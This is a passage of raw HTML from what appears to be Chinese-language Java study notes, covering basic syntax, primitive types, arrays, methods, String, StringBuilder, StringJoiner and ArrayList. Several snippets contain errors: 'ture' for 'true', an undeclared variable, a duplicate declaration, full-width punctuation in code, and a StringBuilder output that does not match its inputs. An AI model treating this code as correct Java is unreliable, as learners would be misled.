class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner</span><br><span class="line"></span><br><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">q</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line"><span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> sc.next();</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">System.out.println(值);  <span class="comment">// 换行</span></span><br><span class="line">sout  <span class="comment">// 匹配 </span></span><br><span class="line"></span><br><span class="line">System.out.print(值);    <span class="comment">// 不换行</span></span><br></pre></td></tr></table></figure><p><strong>注释</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">   <span class="comment">/* 这是第一个Java程序</span></span><br><span class="line"><span class="comment">    * 它将输出 Hello World</span></span><br><span class="line"><span class="comment">    * 这是一个多行注释的示例</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       <span class="comment">// 这是单行注释的示例</span></span><br><span class="line">       <span class="comment">/* 这个也是单行注释的示例 */</span></span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span></span><br><span class="line">    <span class="type">byte</span> 数据类型是<span class="number">8</span>位、有符号的，以二进制补码表示的整数</span><br><span class="line">    最小值，-<span class="number">128</span>（-<span class="number">2</span>^<span class="number">7</span>）,最大值 <span class="number">127</span>（<span class="number">2</span>^<span class="number">7</span>-<span class="number">1</span>）,默认值 <span class="number">0</span></span><br><span class="line">    <span class="type">byte</span> 类型用在大型数组中节约空间，主要代替整数，因为 <span class="type">byte</span> 变量占用的空间只有 <span class="type">int</span> 类型的四分之一；</span><br><span class="line">    例子：<span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>，<span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> -<span class="number">50</span></span><br><span class="line"><span class="type">short</span></span><br><span class="line">    <span class="type">short</span> 数据类型是 <span class="number">16</span> 位、有符号的以二进制补码表示的整数</span><br><span class="line">    -<span class="number">32768</span>（-<span class="number">2</span>^<span class="number">15</span>），<span class="number">32767</span>（<span class="number">2</span>^<span class="number">15</span> - <span class="number">1</span>），<span class="number">0</span></span><br><span class="line">    一个<span class="type">short</span>变量是<span class="type">int</span>型变量所占空间的二分之一</span><br><span class="line"><span class="type">int</span></span><br><span class="line">    <span class="type">int</span> <span class="number">32</span>位，……</span><br><span class="line">    -<span class="number">2</span>,<span class="number">147</span>,<span class="number">483</span>,<span class="number">648</span>（-<span class="number">2</span>^<span class="number">31</span>），<span class="number">2</span>,<span class="number">147</span>,<span class="number">483</span>,<span class="number">647</span>（<span class="number">2</span>^<span class="number">31</span> - <span class="number">1</span>），<span class="number">0</span></span><br><span class="line"><span class="type">long</span></span><br><span class="line">    <span class="number">64</span>位</span><br><span class="line">    默认值 <span class="number">0L</span>，一般不分大小写，最好大写，区分 小写l</span><br><span class="line">    <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100000L</span></span><br><span class="line"><span class="type">float</span></span><br><span class="line">   <span class="type">float</span> 数据类型是单精度、<span class="number">32</span>位、符合IEEE <span class="number">754</span>标准的浮点数；</span><br><span class="line">    <span class="type">float</span> 在储存大型浮点数组的时候可节省内存空间；</span><br><span class="line">    默认值是 <span class="number">0.0f</span>；</span><br><span class="line">    浮点数不能用来表示精确的值，如货币；</span><br><span class="line">    例子：<span class="type">float</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">234.5f</span>。</span><br><span class="line"><span class="type">double</span></span><br><span class="line">    <span class="type">double</span> 数据类型是双精度、<span class="number">64</span> 位、符合 IEEE <span class="number">754</span> 标准的浮点数；</span><br><span class="line">    浮点数的默认类型为 <span class="type">double</span> 类型；</span><br><span class="line">    <span class="type">double</span>类型同样不能表示精确的值，如货币；</span><br><span class="line">    默认值是 <span class="number">0.0d</span>；</span><br><span class="line">  </span><br><span class="line">例子：</span><br><span class="line"><span class="type">double</span>   <span class="variable">d1</span>  <span class="operator">=</span> <span class="number">7D</span> ;</span><br><span class="line"><span class="type">double</span>   <span class="variable">d2</span>  <span class="operator">=</span> <span class="number">7.</span>; </span><br><span class="line"><span class="type">double</span>   <span class="variable">d3</span>  <span class="operator">=</span>  <span class="number">8.0</span>; </span><br><span class="line"><span class="type">double</span>   <span class="variable">d4</span>  <span class="operator">=</span>  <span class="number">8.D</span>; </span><br><span class="line"><span class="type">double</span>   <span class="variable">d5</span>  <span class="operator">=</span>  <span class="number">12.9867</span>;</span><br><span class="line"><span class="number">7</span> 是一个 <span class="type">int</span> 字面量，而 <span class="number">7D</span>，<span class="number">7.</span> 和 <span class="number">8.0</span> 是 <span class="type">double</span> 字面量。</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span></span><br><span class="line">    <span class="type">boolean</span>数据类型表示一位的信息；</span><br><span class="line">    只有两个取值：<span class="literal">true</span> 和 <span class="literal">false</span>；</span><br><span class="line">    这种类型只作为一种标志来记录 <span class="literal">true</span>/<span class="literal">false</span> 情况；</span><br><span class="line">    默认值是 <span class="literal">false</span>；</span><br><span class="line">    例子：<span class="type">boolean</span> <span class="variable">one</span> <span class="operator">=</span> <span class="literal">true</span>。</span><br><span class="line"><span class="type">char</span></span><br><span class="line">    <span class="type">char</span> 类型是一个单一的 <span class="number">16</span> 位 Unicode 字符；</span><br><span class="line">    最小值是 \u0000（十进制等效值为 <span class="number">0</span>）；</span><br><span class="line">    最大值是 \uffff（即为 <span class="number">65535</span>）；</span><br><span class="line">    <span class="type">char</span> 数据类型可以储存任何字符；</span><br><span class="line">    例子：<span class="type">char</span> <span class="variable">letter</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;。</span><br></pre></td></tr></table></figure><p><strong>类型转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 自动类型转换（运算）</span><br><span class="line">整型、实型（常量）、字符型数据可以混合运算。运算中，不同类型的数据先转化为同一类型，然后进行运算。</span><br><span class="line">转换从低级到高级。</span><br><span class="line">低  ---------------------------------------&gt;  高</span><br><span class="line">byte,short,char—&gt; int —&gt; long—&gt; float —&gt; double</span><br><span class="line">  1. 不能对boolean类型进行类型转换。</span><br><span class="line">  2. 不能把对象类型转换成不相关类的对象。</span><br><span class="line">  3. 在把容量大的类型转换为容量小的类型时必须使用强制类型转换。</span><br><span class="line">  4. 转换过程中可能导致溢出或损失精度，例如：</span><br><span class="line">  5. 浮点数到整数的转换是通过舍弃小数得到，而不是四舍五入，</span><br><span class="line"></span><br><span class="line">// 强制类型转换</span><br><span class="line">  1. 条件是转换的数据类型必须是兼容的。</span><br><span class="line">  2. 格式：(type)value type是要强制类型转换后的数据类型 </span><br><span class="line"></span><br><span class="line">// 隐式类型转换（不同类型赋值）</span><br><span class="line">  1. 整数的默认类型是 int。</span><br><span class="line">  2. 小数默认是 double 类型浮点型，在定义 float 类型时必须在数字后面跟上 F 或者 f。</span><br></pre></td></tr></table></figure><h3 id="条件控制"><a href="#条件控制" class="headerlink" title="条件控制"></a>条件控制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// if</span></span><br><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;...</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch (3种格式)</span></span><br><span class="line"><span class="keyword">switch</span>(条件表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ....;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ....;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ....;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(条件表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> -&gt; ....;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span> -&gt; ....;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">default</span> -&gt; ....;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(条件表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> -&gt; &#123;</span><br><span class="line">        ....;</span><br><span class="line">        ....;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span> -&gt; &#123;</span><br><span class="line">        ....;</span><br><span class="line">        ....;</span><br><span class="line">        &#125;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">        ....;</span><br><span class="line">        ....;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( ;条件表达式; )&#123;</span><br><span class="line">    .....;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(条件表达式)&#123;</span><br><span class="line">    ....;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    ....;</span><br><span class="line">&#125;<span class="keyword">while</span>(条件表达式);</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><strong>定义</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">静态定义</span><br><span class="line"><span class="type">int</span>[] array = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;  <span class="comment">// 简写</span></span><br><span class="line"><span class="type">int</span> array[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;  <span class="comment">// 一样</span></span><br><span class="line"></span><br><span class="line">String[] array = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;zhangsan&quot;</span>，<span class="string">&quot;lisi&quot;</span>,<span class="string">&quot;wangwu&quot;</span>&#125;;</span><br><span class="line">String[] array = &#123;<span class="string">&quot;zhangsan&quot;</span>，<span class="string">&quot;lisi&quot;</span>,<span class="string">&quot;wangwu&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">动态定义</span><br><span class="line"><span class="type">int</span>[] array = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">50</span>];</span><br><span class="line">array[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">array[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">....</span><br><span class="line">数组默认初始化值</span><br><span class="line">整型 <span class="number">0</span></span><br><span class="line">浮点型 <span class="number">0.0</span></span><br><span class="line">字符型 <span class="string">&#x27;/u0000&#x27;</span> 空格</span><br><span class="line">布尔型 <span class="literal">false</span></span><br><span class="line">引用   <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">二维数组</span><br><span class="line"><span class="type">int</span>[][] array = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="type">int</span>[][] array = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;  <span class="comment">// 简写</span></span><br></pre></td></tr></table></figure><p><strong>调用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">array    表示数组地址</span><br><span class="line">array[<span class="number">0</span>] 第一个元素 <span class="number">1</span></span><br><span class="line">array[<span class="number">1</span>] 第二个元素 <span class="number">2</span></span><br><span class="line">array[<span class="number">2</span>] 第三个元素 <span class="number">3</span></span><br><span class="line"></span><br><span class="line">System.out.println(array);  <span class="comment">// [I@776ec8df</span></span><br><span class="line">[ 固定的格式</span><br><span class="line">I 数据类型</span><br><span class="line">@ 间隔符</span><br><span class="line">776ec8df <span class="number">16</span>进制地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">    System.out.println(array[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r.nextInt(<span class="number">100</span>)+<span class="number">1</span>;  <span class="comment">// 1-100 随机数</span></span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p><strong>定义</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名(数据类型 形参)&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span>&#123;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">方法名(实参);</span><br><span class="line"></span><br><span class="line">fun();</span><br></pre></td></tr></table></figure><p><strong>重载</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 相同方法名，形参不同</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">num</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">float</span> <span class="title function_">num</span><span class="params">(<span class="type">int</span> a,<span class="type">float</span> b)</span>&#123;</span><br><span class="line">    <span class="type">return</span> <span class="variable">c</span> <span class="operator">=</span> a + b；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">num</span><span class="params">(<span class="type">int</span> a,<span class="type">float</span> b,<span class="type">char</span> c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p><strong>一旦定义，无法更改（内存中），直接赋值 &#x3D; 指向拼接出新的字符串</strong></p><p>值相同的 String 指向同一个区域（仅限直接赋值）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> <span class="string">&quot;qweq&quot;</span>;</span><br><span class="line">直接赋值 存储到串池，串池是堆中的一个特殊区域</span><br><span class="line"><span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;asb&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">String</span> 存储到堆中</span><br><span class="line"><span class="type">String</span> <span class="variable">name3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line">空参构造</span><br><span class="line"><span class="type">char</span>[] chr4 = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">常见类型 存储在堆中</span><br><span class="line"><span class="type">String</span> <span class="variable">chr5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chr4)；</span><br><span class="line">把 chr4 拼接，在堆中新开辟一个区域存储</span><br></pre></td></tr></table></figure><p><strong>字符串比较</strong></p><p>equals 字符串值比较</p><p>equalsIgnoreCase  字符串值比较 忽略大小写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 堆</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;  <span class="comment">// 串池</span></span><br><span class="line">sout(s1 == s2);  <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">r</span> <span class="operator">=</span> s1.equals(s2);  </span><br><span class="line">sout(r);  <span class="comment">// ture</span></span><br></pre></td></tr></table></figure><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><p>可以看成一个容器，创建之后里面的内容是可以变的</p><blockquote><p>StringBuilder(可以空参构造，也可以带有参数)</p><p><strong>成员方法</strong></p><p>apppen 添加数据</p><p>reverse 反转容器内的内容</p><p>length 返回长度（字符出现个数）</p><p>toString 把StringBuilder转换为String</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">sb.append(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">sb.append(<span class="string">&quot;n&quot;</span>);</span><br><span class="line">sb.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">sout(sb);  <span class="comment">// abc</span></span><br><span class="line">sout(sb.reverse());  <span class="comment">//cba</span></span><br><span class="line">sout(sb.length());  <span class="comment">// 3</span></span><br><span class="line"><span class="type">String</span> <span class="variable">bs</span> <span class="operator">=</span> sb.toString(); 这样才能把值赋给 String 类型的变量</span><br><span class="line"></span><br><span class="line">链式方法</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;abc&quot;</span>).append(<span class="string">&quot;123&quot;</span>).length();</span><br></pre></td></tr></table></figure><h3 id="StingJoiner"><a href="#StingJoiner" class="headerlink" title="StingJoiner"></a>StingJoiner</h3><p>例如，将数组转换成字符串时，简略代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br></pre></td></tr></table></figure><blockquote><p>StingJoiner(间隔符号)</p><p>StingJoiner(间隔符号，开始符号，结束符号)</p><p><strong>成员方法</strong></p><p>add</p><p>length</p><p>toString</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">StringJoiner</span> <span class="variable">sj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringJoiner</span>(<span class="string">&quot;, &quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">    sj.add(arr[i]+<span class="string">&quot;&quot;</span>);  <span class="comment">//  + &quot;&quot; 是为了转换为字符串</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sj);</span><br><span class="line">System.out.println(sj.toString()); <span class="comment">// 输出一样</span></span><br></pre></td></tr></table></figure><h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p>ArrayList</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import java.util.ArrayList;</span><br></pre></td></tr></table></figure><blockquote><p>ArrayList<String></p><p><strong>方法</strong></p><p>add</p><p>remove(元素)</p><p>remove(索引)</p><p>set(索引，值) 修改</p><p>get(索引) 获取索引元素</p><p>size （集合长度）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;();</span></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">// JDK7之后</span></span><br><span class="line"></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">// JDK7之后</span></span><br><span class="line">list.add(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line">list.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line">list.remove(<span class="number">0</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line">list.set(<span class="number">0</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(a);</span><br><span class="line"></span><br><span class="line">System.out.println(list.size());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[abc, bbb, ccc]</span><br><span class="line">[bbb, ccc]  <span class="comment">// 删除了abc，索引改变 bbb &lt;- 0  ccc &lt;-1</span></span><br><span class="line">[ccc]  <span class="comment">// 索引只有 0</span></span><br><span class="line">[<span class="number">123</span>]</span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loop: <span class="keyword">while</span> (ture)&#123;</span><br><span class="line">    <span class="keyword">while</span> (ture)&#123;</span><br><span class="line">        <span class="keyword">while</span> (ture)</span><br><span class="line">            <span class="keyword">break</span> 